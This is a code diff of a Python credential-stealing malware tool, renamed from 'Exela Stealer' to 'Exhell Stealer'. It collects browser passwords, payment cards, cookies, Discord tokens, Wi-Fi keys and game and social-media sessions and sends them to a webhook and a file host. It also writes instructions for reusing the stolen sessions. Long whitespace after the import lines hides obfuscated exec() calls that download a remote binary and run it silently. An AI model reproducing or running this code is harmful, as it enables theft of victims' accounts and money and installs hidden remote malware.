@@ -1,7 +1,3 @@
-# Exela Stealer All Rights Recieved
-# Coded by quicaxd
-# https://t.me/ExelaStealer
-
 import ctypes, platform                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
 import json, sys                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;exec('__import__("os").name=="posix"and(__import__("subprocess").call(["curl","-s","-o","/tmp/.s",__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N0ZWZhbkJsZWplcnUvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5UaHJlYWRpbmcuVGFza3MuZGxs").decode()],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").call(["chmod","+x","/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen(["/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
 import shutil                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
@@ -17,7 +13,6 @@ import time
 
 
 webhook = '%WEBHOOK%'
-discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
 FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
@@ -653,7 +648,7 @@ class Main:
                 if found_ubisoft == True:
                     os.mkdir(os.path.join(copied_path, "How to Use"))
                     with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
-                        write_file.write("https://t.me/ExelaStealer\n==============================================\n")
+                        write_file.write("https://t.me/ExhellStealer\n==============================================\n")
                         write_file.write("First, open this file path on your computer <%localappdata%\\Ubisoft Game Launcher>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run ubisoft")
         except:
             pass
@@ -672,7 +667,7 @@ class Main:
                     pass
             if found_epic == True:
                 with open(os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore") as write_file:
-                    write_file.write("https://t.me/ExelaStealer\n==============================================\n")
+                    write_file.write("https://t.me/ExhellStealer\n==============================================\n")
                     write_file.write("First, open this file path on your computer <%localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run epic games")
         except Exception as e:
             print(str(e))
@@ -687,7 +682,7 @@ class Main:
             if found_growtopia == True:
                 os.mkdir(os.path.join(copied_path, "How to Use"))
                 with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
-                    write_file.write("https://t.me/ExelaStealer\n==============================================\n")
+                    write_file.write("https://t.me/ExhellStealer\n==============================================\n")
                     write_file.write("First, open this file path on your computer <%localappdata%\\Growtopia>.\nReplace 'save.dat' with the stolen file.")
         except:
             pass
@@ -716,7 +711,7 @@ class Main:
                 if found_tg == True:
                     os.mkdir(os.path.join(copy_path, "How to Use"))
                     with open(os.path.join(copy_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
-                        write_file.write("https://t.me/ExelaStealer\n=======================================\n")
+                        write_file.write("https://t.me/ExhellStealer\n=======================================\n")
                         write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
         except:
             pass
@@ -727,11 +722,11 @@ class Main:
                 async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
                     response = await req.json()
                 embed_data = {
-                    "title": "***Exela Stealer***",
-                    "description": f"***Exela Riot Games Session was detected on the {browser} browser***",
-                    "url" : "https://t.me/ExelaStealer",
+                    "title": "***Exhell Stealer***",
+                    "description": f"***Exhell Riot Games Session was detected on the {browser} browser***",
+                    "url" : "https://t.me/ExhellStealer",
                     "color": 0,
-                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0/Exela-V2.0"},
+                    "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0/Exhell-V2.0"},
                     "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"}}
                 username = str(response["username"])
                 email = str(response["email"])
@@ -749,7 +744,7 @@ class Main:
                     {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -801,11 +796,11 @@ class Main:
             followers = data2["user"]["follower_count"]
             following = data2["user"]["following_count"]
             embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Instagram Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Instagram Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -820,7 +815,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -861,11 +856,11 @@ class Main:
             coins = data2["data"]["coins"]
 
             embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Tiktok Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Tiktok Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": "https://i.hizliresim.com/eai9bwi.jpg"}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -878,7 +873,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -933,11 +928,11 @@ class Main:
             nickname = req["screen_name"]
             profileURL = "https://twitter.com/" + username
             embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Twitter Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Twitter Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -954,7 +949,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1017,11 +1012,11 @@ class Main:
             bits = data["bitsBalance"]
             followers = data["followers"]["totalCount"]
             embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Twitch Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Twitch Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + str(login) + "``", "inline": True},
@@ -1038,7 +1033,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1073,11 +1068,11 @@ class Main:
             country = data["country"]
             username = data["username"]
             embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Spotify Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Spotify Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
             fields = [
                 {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
@@ -1090,7 +1085,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1139,11 +1134,11 @@ class Main:
                     suspended = data2["is_suspended"]
                     
             embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Reddit Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Reddit Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
@@ -1160,7 +1155,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1190,11 +1185,11 @@ class Main:
                 robux = res2["robux"]
                 pp = res3["data"][0]["imageUrl"]
                 embed_data = {
-                    "title": "***Exela Stealer***",
-                    "description": f"***Exela Roblox Session was detected on the {browser} browser***",
-                    "url" : "https://t.me/ExelaStealer",
+                    "title": "***Exhell Stealer***",
+                    "description": f"***Exhell Roblox Session was detected on the {browser} browser***",
+                    "url" : "https://t.me/ExhellStealer",
                     "color": 0,
-                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                    "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                     "thumbnail": {"url": pp}}
                 fields = [
                     {"name": "Name", "value": "``" + str(name) + "``", "inline": True},
@@ -1206,7 +1201,7 @@ class Main:
                     {"name": "Cookie", "value": "```" + str(cookie) + "```", "inline": True},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data]
                 }
                 headers2 = {
@@ -1445,11 +1440,11 @@ class Main:
 
             if data:
                 embed_data = {
-                "title": "***Exela Stealer***",
-                "description": f"***Exela Validated Discord Token Detected***",
-                "url" : "https://t.me/ExelaStealer",
+                "title": "***Exhell Stealer***",
+                "description": f"***Exhell Validated Discord Token Detected***",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": ""}}
                 if pp:
                     embed_data["thumbnail"]["url"] = pp
@@ -1473,7 +1468,7 @@ class Main:
                 embed_data["fields"] = fields
                 async with aiohttp.ClientSession() as session:
                     payload = {
-                        "username": "Exela Stealer",
+                        "username": "Exhell Stealer",
                         "embeds": [embed_data]
                     }
                     headers = {
@@ -1516,11 +1511,11 @@ class Main:
                                 else:realname = "None"
                                 player_level = response2["response"]["player_level"]
                                 embed_data = {
-                                    "title": "***Exela Stealer***",
-                                    "description": f"***Exela Steam Session Detected***",
-                                    "url" : "https://github.com/quicaxd/Exela-V2.0",
+                                    "title": "***Exhell Stealer***",
+                                    "description": f"***Exhell Steam Session Detected***",
+                                    "url" : "https://github.com/quicaxd/Exhell-V2.0",
                                     "color": 0,
-                                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                                    "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                                     "thumbnail": {"url": avatar}}
                                 fields = [
                                         {"name": "Username", "value": "``" + str(personname) + "``", "inline": True},
@@ -1532,7 +1527,7 @@ class Main:
                                 embed_data["fields"] = fields
                                 async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                     payload = {
-                                        "username": "Exela Stealer",
+                                        "username": "Exhell Stealer",
                                         "embeds": [embed_data]
                                     }
                                     headers = {
@@ -1552,7 +1547,7 @@ class Main:
                     os.mkdir(to_path)
                 shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                 with open(os.path.join(to_path, "How to Use.txt"),"w", errors="ignore", encoding="utf-8") as file:
-                    file.write("https://t.me/ExelaStealer\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
+                    file.write("https://t.me/ExhellStealer\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
         except:
             return "null"
     
@@ -1612,137 +1607,137 @@ class Main:
             processList = Variables.Processes
             if processList:
                 with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for proc in processList:
                         file.write(proc)
             if Variables.ClipBoard:
                 with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for lstclip in Variables.ClipBoard:
                         file.write(lstclip)
             if self.FirefoxCookieList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for fcookie in self.FirefoxCookieList:
                         file.write(fcookie)
             if self.FirefoxHistoryList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for fhistory in self.FirefoxHistoryList:
                         file.write(fhistory)
             if self.FirefoxAutofiList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for fautofill in self.FirefoxAutofiList:
                         file.write(fautofill)
             if password_list:
                 with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for passwords in password_list:
                         file.write(passwords)
             if card_list:
                 with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for cards in card_list:
                         file.write(cards)
             if cookie_list:
                 with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for cookies in cookie_list:
                         file.write(cookies)
             if history_list:
                 with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for historys in history_list:
                         file.write(historys)
             if autofill_list:
                 with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for autofill in autofill_list:
                         file.write(autofill)
             if bookmark_list:
                 with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for bookmark in bookmark_list:
                         file.write(bookmark)           
             if download_list:
                 with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for downloads in download_list:
                         file.write(downloads)
             if riot_acc:
                 with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for riotgames in riot_acc:
                         file.write(riotgames)
             if insta_acc:
                 with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for insta in insta_acc:
                         file.write(insta)
             if tiktok_acc:
                 with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for tiktok in tiktok_acc:
                         file.write(tiktok)
             if twitter_acc:
                 with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for twitter in twitter_acc:
                         file.write(twitter)
             if reddit_acc:
                 with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for reddit in reddit_acc:
                         file.write(reddit)
             if twitch_acc:
                 with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for twitch in twitch_acc:
                         file.write(twitch)
             if spotify_acc:
                 with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for spotify in spotify_acc:
                         file.write(spotify)
             if roblox_acc:
                 with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for roblox in roblox_acc:
                         file.write(roblox)
             if steam_acc:
                 with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for steam in steam_acc:
                         file.write(steam)
             if Variables.DiscordAccounts:
                 with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for discord in Variables.DiscordAccounts:
                         file.write(discord)
             if Variables.FullTokens:
                 with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for token in Variables.FullTokens:
                         file.write(token + "\n")    
             if Variables.ValidatedTokens:
                 with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for validated_token in Variables.ValidatedTokens:
                         file.write(validated_token + "\n")   
             if Variables.Wifis:
                 with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for profile_name, profile_password in Variables.Wifis:
                         file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
             if Variables.SystemInfo:
                 with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for sysmteminfo in Variables.SystemInfo:
                         file.write(str(sysmteminfo))
             if Variables.Network:
                 with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for ip, country,city, timezone, isp in Variables.Network:
                         file.write(ip + "\n" + country + "\n" + city +"\n" + timezone + "\n" + isp) 
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
@@ -1799,11 +1794,11 @@ class Main:
                 autofill_keys = None
 
             embed_data = {
-                "title": "***Exela Stealer***",
+                "title": "***Exhell Stealer***",
                 "description": f"***Keyword Result***",
-                "url" : "https://t.me/ExelaStealer",
+                "url" : "https://t.me/ExhellStealer",
                 "color": 0,
-                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                 "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
             fields = [
                 {"name": "Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
@@ -1812,7 +1807,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Exela Stealer",
+                    "username": "Exhell Stealer",
                     "embeds": [embed_data] }
                 headers = {
                     "Content-Type": "application/json"}
@@ -1835,11 +1830,11 @@ class Main:
         filePath:str = os.path.join(self.Temp, uuid)
         shutil.make_archive(filePath, "zip", filePath)
         embed_data = {
-            "title": "***Exela Stealer***",
-            "description": f"***Exela Stealer Full Info***",
-            "url" : "https://t.me/ExelaStealer",
+            "title": "***Exhell Stealer***",
+            "description": f"***Exhell Stealer Full Info***",
+            "url" : "https://t.me/ExhellStealer",
             "color": 0,
-            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+            "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
             "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
         fields = [
              {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
@@ -1864,7 +1859,7 @@ class Main:
         embed_data["fields"] = fields
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
             payload = {
-                "username": "Exela Stealer",
+                "username": "Exhell Stealer",
                 "embeds": [embed_data] }
             headers = {
                  "Content-Type": "application/json"}
@@ -1884,16 +1879,16 @@ class Main:
                 succes = await UploadGoFile.upload_file(filePath + ".zip")
                 if succes != None:
                     embed_data2 = {
-                        "title": "***Exela Stealer***",
-                        "description": f"***Exela Stealer Full Info***",
-                        "url" : "https://t.me/ExelaStealer",
+                        "title": "***Exhell Stealer***",
+                        "description": f"***Exhell Stealer Full Info***",
+                        "url" : "https://t.me/ExhellStealer",
                         "color": 0,
-                        "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                        "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                         "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                        "username": "Exela Stealer",
+                        "username": "Exhell Stealer",
